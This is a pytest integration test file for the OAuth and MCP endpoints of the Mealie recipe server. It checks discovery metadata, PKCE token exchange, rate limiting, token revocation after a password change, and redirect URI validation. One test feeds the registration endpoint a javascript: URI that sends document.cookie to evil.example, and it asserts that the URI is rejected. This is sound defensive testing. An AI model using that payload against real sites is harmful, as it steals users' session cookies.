import base64
import hashlib
import json
import secrets
from datetime import timedelta
from urllib.parse import parse_qs, urlparse

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import update
from sqlalchemy.orm import Session

from mealie.core.config import get_app_settings
from mealie.db.models._model_utils.datetime import get_utc_now
from mealie.db.models.users.users import User
from tests.integration_tests.mcp.conftest import MCP_HEADERS, mcp_call, mcp_initialize
from tests.utils import api_routes
from tests.utils.fixture_schemas import TestUser

CALLBACK = "https://claude.ai/api/mcp/auth_callback"


def _base_url() -> str:
    return get_app_settings().BASE_URL.rstrip("/")


def _query(url: str) -> dict[str, str]:
    return {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}


def _registration(redirect_uri: str = CALLBACK) -> dict:
    return {
        "client_name": "Claude",
        "redirect_uris": [redirect_uri],
        "grant_types": ["authorization_code", "refresh_token"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "none",
    }


def _register(client: TestClient) -> dict:
    response = client.post("/register", json=_registration())
    assert response.status_code == 201, response.text
    return response.json()


def test_well_known_authorization_server(mcp_client: TestClient):
    response = mcp_client.get("/.well-known/oauth-authorization-server")

    assert response.status_code == 200
    data = response.json()
    assert data["issuer"].rstrip("/") == _base_url()
    assert "S256" in data["code_challenge_methods_supported"]
    assert data["registration_endpoint"] == f"{_base_url()}/register"


def test_well_known_protected_resource(mcp_client: TestClient):
    response = mcp_client.get("/.well-known/oauth-protected-resource/mcp")

    assert response.status_code == 200
    data = response.json()
    assert data["resource"] == f"{_base_url()}/mcp"
    assert [s.rstrip("/") for s in data["authorization_servers"]] == [_base_url()]


def test_mcp_without_token_is_401_with_resource_metadata(mcp_client: TestClient):
    response = mcp_client.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "ping"})

    assert response.status_code == 401
    www_authenticate = response.headers["WWW-Authenticate"]
    assert www_authenticate.startswith("Bearer")
    assert f'resource_metadata="{_base_url()}/.well-known/oauth-protected-resource/mcp"' in www_authenticate


@pytest.mark.parametrize("method", ["GET", "DELETE"])
def test_mcp_other_methods_without_token_are_401(mcp_client: TestClient, method: str):
    response = mcp_client.request(method, "/mcp")

    assert response.status_code == 401


def test_mcp_rejects_session_token(mcp_client: TestClient, unique_user: TestUser):
    response = mcp_client.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "ping"}, headers=unique_user.token)

    assert response.status_code == 401


def test_mcp_initialize_with_mcp_token(mcp_client: TestClient, mcp_bearer: dict[str, str]):
    result, _ = mcp_initialize(mcp_client, mcp_bearer)

    assert result["serverInfo"]["name"] == "Mealie"
    assert result["instructions"]


def test_mcp_call_after_initialize(mcp_client: TestClient, mcp_bearer: dict[str, str]):
    body = mcp_call(mcp_client, mcp_bearer, "tools/list")

    names = {tool["name"] for tool in body["result"]["tools"]}
    assert {"get_household_context", "search_recipes", "get_recipe"} <= names


def test_tools_call_get_household_context(mcp_client: TestClient, mcp_bearer: dict[str, str], unique_user: TestUser):
    # Runs the tool through the real transport: the access token must reach the worker thread.
    body = mcp_call(mcp_client, mcp_bearer, "tools/call", {"name": "get_household_context", "arguments": {}})

    result = body["result"]
    assert not result.get("isError"), result
    context = result.get("structuredContent") or json.loads(result["content"][0]["text"])
    assert context["household"]["id"] == str(unique_user.household_id)
    assert context["user"]["id"] == str(unique_user.user_id)


def _authorize_code(client: TestClient, user: TestUser, client_id: str, verifier: str) -> str:
    """Runs /authorize and the consent step; returns the authorization code."""
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")

    response = client.get(
        "/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": CALLBACK,
            "code_challenge": challenge,
            "code_challenge_method": "S256",
            "state": "xyz",
            "scope": "recipes:read recipes:write",
            "resource": f"{_base_url()}/mcp",
        },
        follow_redirects=False,
    )
    assert response.status_code == 302, response.text
    location = response.headers["location"]
    assert location.startswith(f"{_base_url()}/user/connections/authorize?request_id=")
    request_id = _query(location)["request_id"]

    response = client.post(
        api_routes.users_mcp_authorize,
        json={"requestId": request_id, "approve": True},
        headers=user.token,
    )
    assert response.status_code == 200, response.text
    redirect = response.json()["redirectUrl"]
    assert redirect.startswith(CALLBACK)
    query = _query(redirect)
    assert query["state"] == "xyz"
    return query["code"]


def _token_form(client_info: dict, code: str, verifier: str) -> dict[str, str]:
    form = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": CALLBACK,
        "client_id": client_info["client_id"],
        "code_verifier": verifier,
    }
    if client_info.get("client_secret"):
        form["client_secret"] = client_info["client_secret"]
    return form


def test_full_oauth_flow_via_http(mcp_client: TestClient, unique_user: TestUser):
    client_info = _register(mcp_client)
    verifier = secrets.token_urlsafe(48)
    code = _authorize_code(mcp_client, unique_user, client_info["client_id"], verifier)

    response = mcp_client.post("/token", data=_token_form(client_info, code, verifier))
    assert response.status_code == 200, response.text
    token = response.json()
    assert token["access_token"]
    assert token["refresh_token"]

    result, _ = mcp_initialize(mcp_client, {"Authorization": f"Bearer {token['access_token']}"})
    assert result["serverInfo"]["name"] == "Mealie"


def test_token_with_wrong_code_verifier_is_rejected(mcp_client: TestClient, unique_user: TestUser):
    client_info = _register(mcp_client)
    verifier = secrets.token_urlsafe(48)
    code = _authorize_code(mcp_client, unique_user, client_info["client_id"], verifier)

    response = mcp_client.post("/token", data=_token_form(client_info, code, secrets.token_urlsafe(48)))

    assert response.status_code == 400
    assert response.json()["error"] == "invalid_grant"


def test_register_rate_limited(mcp_client: TestClient):
    statuses = [mcp_client.post("/register", json={}).status_code for _ in range(31)]

    assert all(status != 429 for status in statuses[:30])
    assert statuses[-1] == 429
    assert mcp_client.post("/register", json={}).json() == {"error": "rate_limited"}


def test_rate_limit_ignores_other_paths(mcp_client: TestClient):
    for _ in range(35):
        assert mcp_client.get("/.well-known/oauth-authorization-server").status_code == 200


@pytest.mark.parametrize(
    "redirect_uri",
    ["javascript:fetch('//evil.example/?'+document.cookie)//", "data:text/html,hi", "http://evil.example/cb"],
)
def test_register_rejects_unsafe_redirect_uri(mcp_client: TestClient, redirect_uri: str):
    response = mcp_client.post("/register", json=_registration(redirect_uri))

    assert response.status_code == 400, response.text
    assert response.json()["error"] == "invalid_redirect_uri"


@pytest.mark.parametrize("redirect_uri", [CALLBACK, "http://127.0.0.1:1234/cb"])
def test_register_accepts_https_and_loopback(mcp_client: TestClient, redirect_uri: str):
    response = mcp_client.post("/register", json=_registration(redirect_uri))

    assert response.status_code == 201, response.text


def test_password_change_cuts_off_mcp_grant(mcp_client: TestClient, unique_user_fn_scoped: TestUser, session: Session):
    user = unique_user_fn_scoped
    client_info = _register(mcp_client)
    verifier = secrets.token_urlsafe(48)
    code = _authorize_code(mcp_client, user, client_info["client_id"], verifier)
    token = mcp_client.post("/token", data=_token_form(client_info, code, verifier)).json()
    bearer = {"Authorization": f"Bearer {token['access_token']}"}
    mcp_initialize(mcp_client, bearer)

    # what update_password does (stamped one second ahead so the grant is unambiguously older)
    session.execute(
        update(User).where(User.id == user.user_id).values(tokens_valid_after=get_utc_now() + timedelta(seconds=1))
    )
    session.commit()

    ping = {"jsonrpc": "2.0", "id": 1, "method": "ping"}
    assert mcp_client.post("/mcp", json=ping, headers={**MCP_HEADERS, **bearer}).status_code == 401
    response = mcp_client.post(
        "/token",
        data={
            "grant_type": "refresh_token",
            "refresh_token": token["refresh_token"],
            "client_id": client_info["client_id"],
        },
    )
    assert response.status_code == 400, response.text
    assert response.json()["error"] == "invalid_grant"
